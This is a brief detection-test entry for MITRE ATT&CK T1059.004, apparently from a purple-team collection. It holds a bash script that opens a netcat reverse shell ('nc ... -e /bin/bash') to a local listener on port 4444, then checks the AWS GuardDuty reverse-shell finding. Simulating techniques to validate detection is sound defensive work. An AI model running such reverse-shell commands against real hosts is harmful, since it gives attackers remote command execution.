## Command and Scripting Interpreter: Unix Shell
https://attack.mitre.org/techniques/T1059/004/

### Reverse Shell 

``` bash
echo "Start listener on port 4444"
nc -lvp 4444 &
sleep 2
echo "Reverse shell execution"
nc 127.0.0.1 4444 -e /bin/bash &
sleep 2
echo "Get evidences"
ps aux | grep "nc\|bash"
netstat -otnp | grep 4444
``` 

#### Detection

AWS GuardDuty Runtime Monitoring -> Execution:Runtime/ReverseShell (https://docs.aws.amazon.com/guardduty/latest/ug/findings-runtime-monitoring.html#execution-runtime-reverseshell)